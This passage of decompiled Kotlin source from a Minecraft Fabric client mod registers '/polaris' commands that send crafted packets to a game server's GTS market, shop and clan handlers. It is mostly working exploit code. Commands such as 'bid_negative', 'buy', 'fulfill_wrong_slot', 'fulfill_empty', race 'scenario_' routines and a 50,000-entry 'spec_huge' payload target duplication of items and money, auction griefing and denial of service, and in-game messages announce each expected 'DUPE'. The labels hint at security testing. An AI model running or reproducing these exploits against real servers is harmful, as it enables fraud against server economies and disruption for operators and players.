                                                                                                                                                }
                                                                                                                                             )
                                                                                                                                       )
                                                                                                                                 )
                                                                                                                           ) as LiteralArgumentBuilder)
                                                                                                                        .then(
                                                                                                                           ClientCommandManager.literal("uuid")
                                                                                                                              .executes(
                                                                                                                                 { ctx: CommandContext ->
                                                                                                                                    val var10001: Any = ctx.getSource()
                                                                                                                                    `this$0`.showSelectedUuid(
                                                                                                                                       var10001 as FabricClientCommandSource
                                                                                                                                    )
                                                                                                                                    1
                                                                                                                                 }
                                                                                                                              )
                                                                                                                        ) as LiteralArgumentBuilder)
                                                                                                                     .then(
                                                                                                                        ClientCommandManager.literal("party")
                                                                                                                           .executes({ ctx: CommandContext ->
                                                                                                                              val var10001: Any = ctx.getSource()
                                                                                                                              `this$0`.inspectParty(
                                                                                                                                 var10001 as FabricClientCommandSource
                                                                                                                              )
                                                                                                                              1
                                                                                                                           })
                                                                                                                     ) as LiteralArgumentBuilder)
                                                                                                                  .then(
                                                                                                                     ClientCommandManager.literal("balance")
                                                                                                                        .executes({ ctx: CommandContext ->
                                                                                                                           val var10001: Any = ctx.getSource()
                                                                                                                           `this$0`.inspectBalance(
                                                                                                                              var10001 as FabricClientCommandSource
                                                                                                                           )
                                                                                                                           1
                                                                                                                        })
                                                                                                                  ) as LiteralArgumentBuilder)
                                                                                                               .then(
                                                                                                                  ClientCommandManager.literal("list_burst")
                                                                                                                     .then(
                                                                                                                        ClientCommandManager.argument(
                                                                                                                              "slot",
                                                                                                                              IntegerArgumentType.integer() as ArgumentType
                                                                                                                           )
                                                                                                                           .then(
                                                                                                                              ClientCommandManager.argument(
                                                                                                                                    "price",
                                                                                                                                    LongArgumentType.longArg() as ArgumentType
                                                                                                                                 )
                                                                                                                                 .then(
                                                                                                                                    ClientCommandManager.argument(
                                                                                                                                          "n",
                                                                                                                                          IntegerArgumentType.integer(
                                                                                                                                             1, 200
                                                                                                                                          ) as ArgumentType
                                                                                                                                       )
                                                                                                                                       .executes(
                                                                                                                                          { ctx: CommandContext ->
                                                                                                                                             val slot: Int = IntegerArgumentType.getInteger(
                                                                                                                                                ctx, "slot"
                                                                                                                                             )
                                                                                                                                             val price: Long = LongArgumentType.getLong(
                                                                                                                                                ctx, "price"
                                                                                                                                             )
                                                                                                                                             val n: Int = IntegerArgumentType.getInteger(
                                                                                                                                                ctx, "n"
                                                                                                                                             )
                                                                                                                                             val var10001: Any = ctx.getSource()
                                                                                                                                             `this$0`.listBurst(
                                                                                                                                                var10001 as FabricClientCommandSource,
                                                                                                                                                slot,
                                                                                                                                                price,
                                                                                                                                                n
                                                                                                                                             )
                                                                                                                                             1
                                                                                                                                          }
                                                                                                                                       )
                                                                                                                                 )
                                                                                                                           )
                                                                                                                     )
                                                                                                               ) as LiteralArgumentBuilder)
                                                                                                            .then(
                                                                                                               ClientCommandManager.literal("list_replay")
                                                                                                                  .then(
                                                                                                                     ClientCommandManager.argument(
                                                                                                                           "slot",
                                                                                                                           IntegerArgumentType.integer() as ArgumentType
                                                                                                                        )
                                                                                                                        .then(
                                                                                                                           ClientCommandManager.argument(
                                                                                                                                 "price",
                                                                                                                                 LongArgumentType.longArg() as ArgumentType
                                                                                                                              )
                                                                                                                              .then(
                                                                                                                                 ClientCommandManager.argument(
                                                                                                                                       "n",
                                                                                                                                       IntegerArgumentType.integer(
                                                                                                                                          1, 50
                                                                                                                                       ) as ArgumentType
                                                                                                                                    )
                                                                                                                                    .executes(
                                                                                                                                       { ctx: CommandContext ->
                                                                                                                                          val slot: Int = IntegerArgumentType.getInteger(
                                                                                                                                             ctx, "slot"
                                                                                                                                          )
                                                                                                                                          val price: Long = LongArgumentType.getLong(
                                                                                                                                             ctx, "price"
                                                                                                                                          )
                                                                                                                                          val n: Int = IntegerArgumentType.getInteger(
                                                                                                                                             ctx, "n"
                                                                                                                                          )
                                                                                                                                          val var10001: Any = ctx.getSource()
                                                                                                                                          `this$0`.listReplay(
                                                                                                                                             var10001 as FabricClientCommandSource,
                                                                                                                                             slot,
                                                                                                                                             price,
                                                                                                                                             n
                                                                                                                                          )
                                                                                                                                          1
                                                                                                                                       }
                                                                                                                                    )
                                                                                                                              )
                                                                                                                        )
                                                                                                                  )
                                                                                                            ) as LiteralArgumentBuilder)
                                                                                                         .then(
                                                                                                            ClientCommandManager.literal("mass_list")
                                                                                                               .then(
                                                                                                                  ClientCommandManager.argument(
                                                                                                                        "price",
                                                                                                                        LongArgumentType.longArg() as ArgumentType
                                                                                                                     )
                                                                                                                     .executes({ ctx: CommandContext ->
                                                                                                                        val price: Long = LongArgumentType.getLong(
                                                                                                                           ctx, "price"
                                                                                                                        )
                                                                                                                        val var10001: Any = ctx.getSource()
                                                                                                                        `this$0`.massList(
                                                                                                                           var10001 as FabricClientCommandSource,
                                                                                                                           price
                                                                                                                        )
                                                                                                                        1
                                                                                                                     })
                                                                                                               )
                                                                                                         ) as LiteralArgumentBuilder)
                                                                                                      .then(
                                                                                                         ClientCommandManager.literal("double_list")
                                                                                                            .then(
                                                                                                               ClientCommandManager.argument(
                                                                                                                     "slotA",
                                                                                                                     IntegerArgumentType.integer() as ArgumentType
                                                                                                                  )
                                                                                                                  .then(
                                                                                                                     ClientCommandManager.argument(
                                                                                                                           "slotB",
                                                                                                                           IntegerArgumentType.integer() as ArgumentType
                                                                                                                        )
                                                                                                                        .then(
                                                                                                                           ClientCommandManager.argument(
                                                                                                                                 "price",
                                                                                                                                 LongArgumentType.longArg() as ArgumentType
                                                                                                                              )
                                                                                                                              .executes(
                                                                                                                                 { ctx: CommandContext ->
                                                                                                                                    val sa: Int = IntegerArgumentType.getInteger(
                                                                                                                                       ctx, "slotA"
                                                                                                                                    )
                                                                                                                                    val sb: Int = IntegerArgumentType.getInteger(
                                                                                                                                       ctx, "slotB"
                                                                                                                                    )
                                                                                                                                    val price: Long = LongArgumentType.getLong(
                                                                                                                                       ctx, "price"
                                                                                                                                    )
                                                                                                                                    val var10001: Any = ctx.getSource()
                                                                                                                                    `this$0`.doubleList(
                                                                                                                                       var10001 as FabricClientCommandSource,
                                                                                                                                       sa,
                                                                                                                                       sb,
                                                                                                                                       price
                                                                                                                                    )
                                                                                                                                    1
                                                                                                                                 }
                                                                                                                              )
                                                                                                                        )
                                                                                                                  )
                                                                                                            )
                                                                                                      ) as LiteralArgumentBuilder)
                                                                                                   .then(
                                                                                                      ClientCommandManager.literal("withdraw_burst")
                                                                                                         .then(
                                                                                                            ClientCommandManager.argument(
                                                                                                                  "uuid",
                                                                                                                  StringArgumentType.word() as ArgumentType
                                                                                                               )
                                                                                                               .then(
                                                                                                                  ClientCommandManager.argument(
                                                                                                                        "n",
                                                                                                                        IntegerArgumentType.integer(1, 200) as ArgumentType
                                                                                                                     )
                                                                                                                     .executes({ ctx: CommandContext ->
                                                                                                                        val id: UUID = UUID.fromString(
                                                                                                                           StringArgumentType.getString(
                                                                                                                              ctx, "uuid"
                                                                                                                           )
                                                                                                                        )
                                                                                                                        val n: Int = IntegerArgumentType.getInteger(
                                                                                                                           ctx, "n"
                                                                                                                        )
                                                                                                                        var var10001: FabricClientCommandSource = (FabricClientCommandSource)ctx.getSource()
                                                                                                                        var10001 = var10001
                                                                                                                        `this$0`.withdrawBurst(var10001, id, n)
                                                                                                                        1
                                                                                                                     })
                                                                                                               )
                                                                                                         )
                                                                                                   ) as LiteralArgumentBuilder)
                                                                                                .then(
                                                                                                   ClientCommandManager.literal("self_purchase_test")
                                                                                                      .executes({ ctx: CommandContext ->
                                                                                                         val var10001: Any = ctx.getSource()
                                                                                                         `this$0`.selfPurchaseGuide(
                                                                                                            var10001 as FabricClientCommandSource
                                                                                                         )
                                                                                                         1
                                                                                                      })
                                                                                                ) as LiteralArgumentBuilder)
                                                                                             .then(
                                                                                                ClientCommandManager.literal("trade_self")
                                                                                                   .then(
                                                                                                      ClientCommandManager.argument(
                                                                                                            "slot",
                                                                                                            IntegerArgumentType.integer() as ArgumentType
                                                                                                         )
                                                                                                         .then(
                                                                                                            ClientCommandManager.argument(
                                                                                                                  "species",
                                                                                                                  StringArgumentType.word() as ArgumentType
                                                                                                               )
                                                                                                               .executes({ ctx: CommandContext ->
                                                                                                                  val slot: Int = IntegerArgumentType.getInteger(
                                                                                                                     ctx, "slot"
                                                                                                                  )
                                                                                                                  val species: java.lang.String = StringArgumentType.getString(
                                                                                                                     ctx, "species"
                                                                                                                  )
                                                                                                                  var var10001: FabricClientCommandSource = (FabricClientCommandSource)ctx.getSource()
                                                                                                                  var10001 = var10001
                                                                                                                  `this$0`.tradeSelfGuide(
                                                                                                                     var10001, slot, species
                                                                                                                  )
                                                                                                                  1
                                                                                                               })
                                                                                                         )
                                                                                                   )
                                                                                             ) as LiteralArgumentBuilder)
                                                                                          .then(
                                                                                             ClientCommandManager.literal("scenario_move_then_list")
                                                                                                .then(
                                                                                                   ClientCommandManager.argument(
                                                                                                         "slot", IntegerArgumentType.integer() as ArgumentType
                                                                                                      )
                                                                                                      .then(
                                                                                                         ClientCommandManager.argument(
                                                                                                               "price",
                                                                                                               LongArgumentType.longArg() as ArgumentType
                                                                                                            )
                                                                                                            .executes({ ctx: CommandContext ->
                                                                                                               val slot: Int = IntegerArgumentType.getInteger(
                                                                                                                  ctx, "slot"
                                                                                                               )
                                                                                                               val price: Long = LongArgumentType.getLong(
                                                                                                                  ctx, "price"
                                                                                                               )
                                                                                                               val var10001: Any = ctx.getSource()
                                                                                                               `this$0`.scenarioMoveThenList(
                                                                                                                  var10001 as FabricClientCommandSource,
                                                                                                                  slot,
                                                                                                                  price
                                                                                                               )
                                                                                                               1
                                                                                                            })
                                                                                                      )
                                                                                                )
                                                                                          ) as LiteralArgumentBuilder)
                                                                                       .then(
                                                                                          ClientCommandManager.literal("scenario_list_then_trade")
                                                                                             .then(
                                                                                                ClientCommandManager.argument(
                                                                                                      "slot", IntegerArgumentType.integer() as ArgumentType
                                                                                                   )
                                                                                                   .then(
                                                                                                      ClientCommandManager.argument(
                                                                                                            "price", LongArgumentType.longArg() as ArgumentType
                                                                                                         )
                                                                                                         .executes({ ctx: CommandContext ->
                                                                                                            val slot: Int = IntegerArgumentType.getInteger(
                                                                                                               ctx, "slot"
                                                                                                            )
                                                                                                            val price: Long = LongArgumentType.getLong(
                                                                                                               ctx, "price"
                                                                                                            )
                                                                                                            val var10001: Any = ctx.getSource()
                                                                                                            `this$0`.scenarioListThenTrade(
                                                                                                               var10001 as FabricClientCommandSource,
                                                                                                               slot,
                                                                                                               price
                                                                                                            )
                                                                                                            1
                                                                                                         })
                                                                                                   )
                                                                                             )
                                                                                       ) as LiteralArgumentBuilder)
                                                                                    .then(
                                                                                       ClientCommandManager.literal("scenario_list_countdown")
                                                                                          .then(
                                                                                             ClientCommandManager.argument(
                                                                                                   "slot", IntegerArgumentType.integer() as ArgumentType
                                                                                                )
                                                                                                .then(
                                                                                                   ClientCommandManager.argument(
                                                                                                         "price", LongArgumentType.longArg() as ArgumentType
                                                                                                      )
                                                                                                      .then(
                                                                                                         ClientCommandManager.argument(
                                                                                                               "delay_sec",
                                                                                                               IntegerArgumentType.integer(1, 60) as ArgumentType
                                                                                                            )
                                                                                                            .executes({ ctx: CommandContext ->
                                                                                                               val slot: Int = IntegerArgumentType.getInteger(
                                                                                                                  ctx, "slot"
                                                                                                               )
                                                                                                               val price: Long = LongArgumentType.getLong(
                                                                                                                  ctx, "price"
                                                                                                               )
                                                                                                               val delay: Int = IntegerArgumentType.getInteger(
                                                                                                                  ctx, "delay_sec"
                                                                                                               )
                                                                                                               val var10001: Any = ctx.getSource()
                                                                                                               `this$0`.scenarioListCountdown(
                                                                                                                  var10001 as FabricClientCommandSource,
                                                                                                                  slot,
                                                                                                                  price,
                                                                                                                  delay
                                                                                                               )
                                                                                                               1
                                                                                                            })
                                                                                                      )
                                                                                                )
                                                                                          )
                                                                                    ) as LiteralArgumentBuilder)
                                                                                 .then(
                                                                                    ClientCommandManager.literal("scenario_list_autocheck")
                                                                                       .then(
                                                                                          ClientCommandManager.argument(
                                                                                                "slot", IntegerArgumentType.integer() as ArgumentType
                                                                                             )
                                                                                             .then(
                                                                                                ClientCommandManager.argument(
                                                                                                      "price", LongArgumentType.longArg() as ArgumentType
                                                                                                   )
                                                                                                   .executes({ ctx: CommandContext ->
                                                                                                      val slot: Int = IntegerArgumentType.getInteger(
                                                                                                         ctx, "slot"
                                                                                                      )
                                                                                                      val price: Long = LongArgumentType.getLong(ctx, "price")
                                                                                                      val var10001: Any = ctx.getSource()
                                                                                                      `this$0`.scenarioListAutocheck(
                                                                                                         var10001 as FabricClientCommandSource, slot, price
                                                                                                      )
                                                                                                      1
                                                                                                   })
                                                                                             )
                                                                                       )
                                                                                 ) as LiteralArgumentBuilder)
                                                                              .then(
                                                                                 ClientCommandManager.literal("scenario_list_during_trade")
                                                                                    .then(
                                                                                       ClientCommandManager.argument(
                                                                                             "slot", IntegerArgumentType.integer() as ArgumentType
                                                                                          )
                                                                                          .then(
                                                                                             ClientCommandManager.argument(
                                                                                                   "price", LongArgumentType.longArg() as ArgumentType
                                                                                                )
                                                                                                .then(
                                                                                                   ClientCommandManager.argument(
                                                                                                         "delay_sec",
                                                                                                         IntegerArgumentType.integer(1, 120) as ArgumentType
                                                                                                      )
                                                                                                      .executes({ ctx: CommandContext ->
                                                                                                         val slot: Int = IntegerArgumentType.getInteger(
                                                                                                            ctx, "slot"
                                                                                                         )
                                                                                                         val price: Long = LongArgumentType.getLong(
                                                                                                            ctx, "price"
                                                                                                         )
                                                                                                         val delay: Int = IntegerArgumentType.getInteger(
                                                                                                            ctx, "delay_sec"
                                                                                                         )
                                                                                                         val var10001: Any = ctx.getSource()
                                                                                                         `this$0`.scenarioListDuringTrade(
                                                                                                            var10001 as FabricClientCommandSource,
                                                                                                            slot,
                                                                                                            price,
                                                                                                            delay
                                                                                                         )
                                                                                                         1
                                                                                                      })
                                                                                                )
                                                                                          )
                                                                                    )
                                                                              ) as LiteralArgumentBuilder)
                                                                           .then(
                                                                              ClientCommandManager.literal("list_quick")
                                                                                 .then(
                                                                                    ClientCommandManager.argument(
                                                                                          "slot", IntegerArgumentType.integer() as ArgumentType
                                                                                       )
                                                                                       .then(
                                                                                          ClientCommandManager.argument(
                                                                                                "price", LongArgumentType.longArg() as ArgumentType
                                                                                             )
                                                                                             .then(
                                                                                                ClientCommandManager.argument(
                                                                                                      "delay_ms",
                                                                                                      IntegerArgumentType.integer(0, 30000) as ArgumentType
                                                                                                   )
                                                                                                   .executes({ ctx: CommandContext ->
                                                                                                      val slot: Int = IntegerArgumentType.getInteger(
                                                                                                         ctx, "slot"
                                                                                                      )
                                                                                                      val price: Long = LongArgumentType.getLong(ctx, "price")
                                                                                                      val delay: Int = IntegerArgumentType.getInteger(
                                                                                                         ctx, "delay_ms"
                                                                                                      )
                                                                                                      val var10001: Any = ctx.getSource()
                                                                                                      `this$0`.scenarioListQuick(
                                                                                                         var10001 as FabricClientCommandSource,
                                                                                                         slot,
                                                                                                         price,
                                                                                                         delay
                                                                                                      )
                                                                                                      1
                                                                                                   })
                                                                                             )
                                                                                       )
                                                                                 )
                                                                           ) as LiteralArgumentBuilder)
                                                                        .then(
                                                                           ClientCommandManager.literal("purchase_garbage").executes({ ctx: CommandContext ->
                                                                              val var10001: Any = ctx.getSource()
                                                                              `this$0`.send(
                                                                                 var10001 as FabricClientCommandSource,
                                                                                 "PurchasePokemonPayload com UUID aleatório",
                                                                                 { 
                                                                                    val var10002: UUID = UUID.randomUUID()
                                                                                    ClientPlayNetworking.send(PurchasePokemonPayload(var10002) as class_8710)
                                                                                    Unit.INSTANCE
                                                                                 }
                                                                              )
                                                                              1
                                                                           })
                                                                        ) as LiteralArgumentBuilder)
                                                                     .then(ClientCommandManager.literal("withdraw_garbage").executes({ ctx: CommandContext ->
                                                                        val var10001: Any = ctx.getSource()
                                                                        `this$0`.send(
                                                                           var10001 as FabricClientCommandSource,
                                                                           "WithdrawListingPayload com UUID aleatório",
                                                                           { 
                                                                              val var10002: UUID = UUID.randomUUID()
                                                                              ClientPlayNetworking.send(WithdrawListingPayload(var10002) as class_8710)
                                                                              Unit.INSTANCE
                                                                           }
                                                                        )
                                                                        1
                                                                     })) as LiteralArgumentBuilder)
                                                                  .then(
                                                                     ClientCommandManager.literal("buy")
                                                                        .then(
                                                                           ClientCommandManager.argument("uuid", StringArgumentType.word() as ArgumentType)
                                                                              .executes(
                                                                                 { ctx: CommandContext ->
                                                                                    val id: UUID = UUID.fromString(StringArgumentType.getString(ctx, "uuid"))
                                                                                    val balBefore: Long = GtsClientData.INSTANCE.getBalance()
                                                                                    var var10001: Any = ctx.getSource()
                                                                                    `this$0`.send(
                                                                                       var10001 as FabricClientCommandSource,
                                                                                       "BUY-NO-MONEY: PurchasePokemonPayload($id), balance ANTES=$balBefore",
                                                                                       { 
                                                                                          ClientPlayNetworking.send(PurchasePokemonPayload(`$id`) as class_8710)
                                                                                          Unit.INSTANCE
                                                                                       }
                                                                                    )
                                                                                    var10001 = ctx.getSource()
                                                                                    `this$0`.msg(
                                                                                       var10001 as FabricClientCommandSource,
                                                                                       "   Depois: /polaris gts balance E /polaris gts party.",
                                                                                       class_124.field_1054
                                                                                    )
                                                                                    var10001 = ctx.getSource()
                                                                                    `this$0`.msg(
                                                                                       var10001 as FabricClientCommandSource,
                                                                                       "   DUPE: pokémon recebido + balance NÃO caiu = sem validação financeira.",
                                                                                       class_124.field_1061
                                                                                    )
                                                                                    1
                                                                                 }
                                                                              )
                                                                        )
                                                                  ) as LiteralArgumentBuilder)
                                                               .then(
                                                                  ClientCommandManager.literal("buy_chain")
                                                                     .then(
                                                                        ClientCommandManager.argument(
                                                                              "uuids_csv", StringArgumentType.greedyString() as ArgumentType
                                                                           )
                                                                           .executes({ ctx: CommandContext ->
                                                                              val csv: java.lang.String = StringArgumentType.getString(ctx, "uuids_csv")
                                                                              val `$this$mapNotNullTo$iv$iv`: java.lang.Iterable = StringsKt.split$default(
                                                                                 csv, arrayOf(","), false, 0, 6, null
                                                                              )
                                                                              val `destination$iv$iv`: java.util.Collection = ArrayList()

                                                                              for (`element$iv$iv$iv` in `$this$mapNotNullTo$iv$iv`) {
                                                                                 val it: java.lang.String = `element$iv$iv$iv` as java.lang.String

                                                                                 var var17: Any
                                                                                 try {
                                                                                    var17 = UUID.fromString(StringsKt.trim(it).toString())
                                                                                 } catch (var21: java.lang.Throwable) {
                                                                                    var17 = null
                                                                                 }

                                                                                 if (var17 != null) {
                                                                                    `destination$iv$iv`.add(var17)
                                                                                 }
                                                                              }

                                                                              val uuids: java.util.List = `destination$iv$iv` as java.util.List
                                                                              val var10001: Any = ctx.getSource()
                                                                              `this$0`.buyChain(var10001 as FabricClientCommandSource, uuids)
                                                                              1
                                                                           })
                                                                     )
                                                               ) as LiteralArgumentBuilder)
                                                            .then(
                                                               ClientCommandManager.literal("bid_excess")
                                                                  .then(
                                                                     ClientCommandManager.argument("uuid", StringArgumentType.word() as ArgumentType)
                                                                        .then(
                                                                           ClientCommandManager.argument("amount", LongArgumentType.longArg() as ArgumentType)
                                                                              .executes(
                                                                                 { ctx: CommandContext ->
                                                                                    val id: UUID = UUID.fromString(StringArgumentType.getString(ctx, "uuid"))
                                                                                    val amt: Long = LongArgumentType.getLong(ctx, "amount")
                                                                                    val balBefore: Long = GtsClientData.INSTANCE.getBalance()
                                                                                    var var10001: Any = ctx.getSource()
                                                                                    `this$0`.send(
                                                                                       var10001 as FabricClientCommandSource,
                                                                                       "BID-NO-MONEY: PlaceBidPayload($id, amount=$amt), balance ANTES=$balBefore",
                                                                                       { 
                                                                                          ClientPlayNetworking.send(
                                                                                             PlaceBidPayload(`$id`, `$amt`) as class_8710
                                                                                          )
                                                                                          Unit.INSTANCE
                                                                                       }
                                                                                    )
                                                                                    var10001 = ctx.getSource()
                                                                                    `this$0`.msg(
                                                                                       var10001 as FabricClientCommandSource,
                                                                                       "   Bug: bid registrado e vc é highest bidder mesmo sem money pra honrar.",
                                                                                       class_124.field_1061
                                                                                    )
                                                                                    1
                                                                                 }
                                                                              )
                                                                        )
                                                                  )
                                                            ) as LiteralArgumentBuilder)
                                                         .then(
                                                            ClientCommandManager.literal("bid_max")
                                                               .then(
                                                                  ClientCommandManager.argument("uuid", StringArgumentType.word() as ArgumentType)
                                                                     .executes(
                                                                        { ctx: CommandContext ->
                                                                           val id: UUID = UUID.fromString(StringArgumentType.getString(ctx, "uuid"))
                                                                           var var10001: Any = ctx.getSource()
                                                                           `this$0`.send(
                                                                              var10001 as FabricClientCommandSource,
                                                                              "BID Long.MAX_VALUE em $id (impossível ter esse dinheiro)",
                                                                              { 
                                                                                 ClientPlayNetworking.send(
                                                                                    PlaceBidPayload(`$id`, java.lang.Long.MAX_VALUE) as class_8710
                                                                                 )
                                                                                 Unit.INSTANCE
                                                                              }
                                                                           )
                                                                           var10001 = ctx.getSource()
                                                                           `this$0`.msg(
                                                                              var10001 as FabricClientCommandSource,
                                                                              "   Espera: server recusa. Bug: bid registra e bloqueia o leilão (griefing).",
                                                                              class_124.field_1054
                                                                           )
                                                                           1
                                                                        }
                                                                     )
                                                               )
                                                         ) as LiteralArgumentBuilder)
                                                      .then(
                                                         ClientCommandManager.literal("bid_negative")
                                                            .then(
                                                               ClientCommandManager.argument("uuid", StringArgumentType.word() as ArgumentType)
                                                                  .then(
                                                                     ClientCommandManager.argument("amount", LongArgumentType.longArg() as ArgumentType)
                                                                        .executes(
                                                                           { ctx: CommandContext ->
                                                                              val id: UUID = UUID.fromString(StringArgumentType.getString(ctx, "uuid"))
                                                                              val amt: Long = LongArgumentType.getLong(ctx, "amount")
                                                                              var var10001: Any = ctx.getSource()
                                                                              `this$0`.send(
                                                                                 var10001 as FabricClientCommandSource,
                                                                                 "BID NEGATIVO: PlaceBidPayload($id, amount=$amt)",
                                                                                 { 
                                                                                    ClientPlayNetworking.send(PlaceBidPayload(`$id`, `$amt`) as class_8710)
                                                                                    Unit.INSTANCE
                                                                                 }
                                                                              )
                                                                              var10001 = ctx.getSource()
                                                                              `this$0`.msg(
                                                                                 var10001 as FabricClientCommandSource,
                                                                                 "   DUPE de money: server cobra valor negativo = vc GANHA money. Verifica /polaris gts balance.",
                                                                                 class_124.field_1061
                                                                              )
                                                                              1
                                                                           }
                                                                        )
                                                                  )
                                                            )
                                                      ) as LiteralArgumentBuilder)
                                                   .then(
                                                      ClientCommandManager.literal("buy_spam_different")
                                                         .then(
                                                            ClientCommandManager.argument("uuids_csv", StringArgumentType.greedyString() as ArgumentType)
                                                               .executes({ ctx: CommandContext ->
                                                                  val csv: java.lang.String = StringArgumentType.getString(ctx, "uuids_csv")
                                                                  val `$this$mapNotNullTo$iv$iv`: java.lang.Iterable = StringsKt.split$default(
                                                                     csv, arrayOf(","), false, 0, 6, null
                                                                  )
                                                                  val `destination$iv$iv`: java.util.Collection = ArrayList()

                                                                  for (`element$iv$iv$iv` in `$this$mapNotNullTo$iv$iv`) {
                                                                     val it: java.lang.String = `element$iv$iv$iv` as java.lang.String

                                                                     var var17: Any
                                                                     try {
                                                                        var17 = UUID.fromString(StringsKt.trim(it).toString())
                                                                     } catch (var21: java.lang.Throwable) {
                                                                        var17 = null
                                                                     }

                                                                     if (var17 != null) {
                                                                        `destination$iv$iv`.add(var17)
                                                                     }
                                                                  }

                                                                  val uuids: java.util.List = `destination$iv$iv` as java.util.List
                                                                  val var10001: Any = ctx.getSource()
                                                                  `this$0`.buySpamDifferent(var10001 as FabricClientCommandSource, uuids)
                                                                  1
                                                               })
                                                         )
                                                   ) as LiteralArgumentBuilder)
                                                .then(
                                                   ClientCommandManager.literal("fulfill_wrong_slot")
                                                      .then(
                                                         ClientCommandManager.argument("uuid", StringArgumentType.word() as ArgumentType)
                                                            .then(
                                                               ClientCommandManager.argument("slot", IntegerArgumentType.integer() as ArgumentType)
                                                                  .executes(
                                                                     { ctx: CommandContext ->
                                                                        val id: UUID = UUID.fromString(StringArgumentType.getString(ctx, "uuid"))
                                                                        val slot: Int = IntegerArgumentType.getInteger(ctx, "slot")
                                                                        var var10001: Any = ctx.getSource()
                                                                        `this$0`.send(
                                                                           var10001 as FabricClientCommandSource,
                                                                           "FULFILL com slot $slot (que pode não bater com request)",
                                                                           { 
                                                                              ClientPlayNetworking.send(FulfillTradePayload(`$id`, `$slot`) as class_8710)
                                                                              Unit.INSTANCE
                                                                           }
                                                                        )
                                                                        var10001 = ctx.getSource()
                                                                        `this$0`.msg(
                                                                           var10001 as FabricClientCommandSource,
                                                                           "   DUPE: vc recebe o pokémon ofertado entregando pokémon errado/empty.",
                                                                           class_124.field_1061
                                                                        )
                                                                        1
                                                                     }
                                                                  )
                                                            )
                                                      )
                                                ) as LiteralArgumentBuilder)
                                             .then(
                                                ClientCommandManager.literal("fulfill_empty")
                                                   .then(
                                                      ClientCommandManager.argument("uuid", StringArgumentType.word() as ArgumentType)
                                                         .executes({ ctx: CommandContext ->
                                                            val id: UUID = UUID.fromString(StringArgumentType.getString(ctx, "uuid"))
                                                            var var10001: FabricClientCommandSource = (FabricClientCommandSource)ctx.getSource()
                                                            `this$0`.msg(
                                                               var10001, ">> Fulfill com slots 0-5 simultâneos (1+ pode estar vazio)", class_124.field_1075
                                                            )
                                                            var10001 = ctx.getSource()
                                                            var10001 = var10001 as FabricClientCommandSource
                                                            `this$0`.fulfillEmptySlots(var10001, id)
                                                            1
                                                         })
                                                   )
                                             ) as LiteralArgumentBuilder)
                                          .then(
                                             ClientCommandManager.literal("spec_huge")
                                                .then(
                                                   ClientCommandManager.argument("slot", IntegerArgumentType.integer() as ArgumentType)
                                                      .executes(
                                                         { ctx: CommandContext ->
                                                            val slot: Int = IntegerArgumentType.getInteger(ctx, "slot")
                                                            val `$this$associate$iv`: java.lang.Iterable = IntRange(1, 50000) as java.lang.Iterable
                                                            val `destination$iv$iv`: java.util.Map = LinkedHashMap(
                                                               RangesKt.coerceAtLeast(
                                                                  MapsKt.mapCapacity(CollectionsKt.collectionSizeOrDefault(`$this$associate$iv`, 10)), 16
                                                               )
                                                            )
                                                            val var10: java.util.Iterator = `$this$associate$iv`.iterator()

                                                            while (var10.hasNext()) {
                                                               val `element$iv$iv`: Int = (var10 as IntIterator).nextInt()
                                                               val var15: Pair = TuplesKt.to("stat_$`element$iv$iv`", `element$iv$iv`)
                                                               `destination$iv$iv`.put(var15.getFirst(), var15.getSecond())
                                                            }

                                                            val var10001: Any = ctx.getSource()
                                                            `this$0`.send(
                                                               var10001 as FabricClientCommandSource, "TradePokemonPayload com 50k IVs (testa F-10 DoS)", { 
                                                                  ClientPlayNetworking.send(
                                                                     TradePokemonPayload(`$slot`, PokemonSpec("gengar", 1, false, null, null, `$ivs`)) as class_8710
                                                                  )
                                                                  Unit.INSTANCE
                                                               }
                                                            )
                                                            1
                                                         }
                                                      )
                                                )
                                          )
                                    ) as LiteralArgumentBuilder)
                                 .then(
                                    (ClientCommandManager.literal("shop")
                                          .then(
                                             ClientCommandManager.literal("sell")
                                                .then(
                                                   ClientCommandManager.argument("itemId", StringArgumentType.string() as ArgumentType)
                                                      .then(
                                                         ClientCommandManager.argument("qty", IntegerArgumentType.integer() as ArgumentType)
                                                            .executes({ ctx: CommandContext ->
                                                               val item: java.lang.String = StringArgumentType.getString(ctx, "itemId")
                                                               val qty: Int = IntegerArgumentType.getInteger(ctx, "qty")
                                                               val var10001: Any = ctx.getSource()
                                                               `this$0`.send(
                                                                  var10001 as FabricClientCommandSource, "RequestSellPayload(itemId='$item', qty=$qty)", { 
                                                                     ClientPlayNetworking.send(RequestSellPayload(`$item`, `$qty`) as class_8710)
                                                                     Unit.INSTANCE
                                                                  }
                                                               )
                                                               1
                                                            })
                                                      )
                                                )
                                          ) as LiteralArgumentBuilder)
                                       .then(
                                          ClientCommandManager.literal("buy")
                                             .then(
                                                ClientCommandManager.argument("itemId", StringArgumentType.string() as ArgumentType)
                                                   .then(
                                                      ClientCommandManager.argument("qty", IntegerArgumentType.integer() as ArgumentType)
                                                         .executes({ ctx: CommandContext ->
                                                            val item: java.lang.String = StringArgumentType.getString(ctx, "itemId")
                                                            val qty: Int = IntegerArgumentType.getInteger(ctx, "qty")
                                                            val var10001: Any = ctx.getSource()
                                                            `this$0`.send(
                                                               var10001 as FabricClientCommandSource, "RequestPurchasePayload(itemId='$item', qty=$qty)", { 
                                                                  ClientPlayNetworking.send(RequestPurchasePayload(`$item`, `$qty`) as class_8710)
                                                                  Unit.INSTANCE
                                                               }
                                                            )
                                                            1
                                                         })
                                                   )
                                             )
                                       )
                                 ) as LiteralArgumentBuilder)
                              .then(
                                 ((((((((((((((((((((((ClientCommandManager.literal("clan")
                                                                                                      .then(
                                                                                                         ClientCommandManager.literal("create")
                                                                                                            .then(
                                                                                                               ClientCommandManager.argument(
                                                                                                                     "name",
                                                                                                                     StringArgumentType.string() as ArgumentType
                                                                                                                  )
                                                                                                                  .then(
                                                                                                                     ClientCommandManager.argument(
                                                                                                                           "tag",
                                                                                                                           StringArgumentType.string() as ArgumentType
                                                                                                                        )
                                                                                                                        .executes({ ctx: CommandContext ->
                                                                                                                           val name: java.lang.String = StringArgumentType.getString(
                                                                                                                              ctx, "name"
                                                                                                                           )
                                                                                                                           val tag: java.lang.String = StringArgumentType.getString(
                                                                                                                              ctx, "tag"
                                                                                                                           )
                                                                                                                           val var10001: Any = ctx.getSource()
                                                                                                                           `this$0`.send(
                                                                                                                              var10001 as FabricClientCommandSource,
                                                                                                                              "CreateClanPayload(name='$name', tag='$tag')",
                                                                                                                              { 
                                                                                                                                 ClientPlayNetworking.send(
                                                                                                                                    CreateClanPayload(
                                                                                                                                       `$name`, `$tag`
                                                                                                                                    ) as class_8710
                                                                                                                                 )
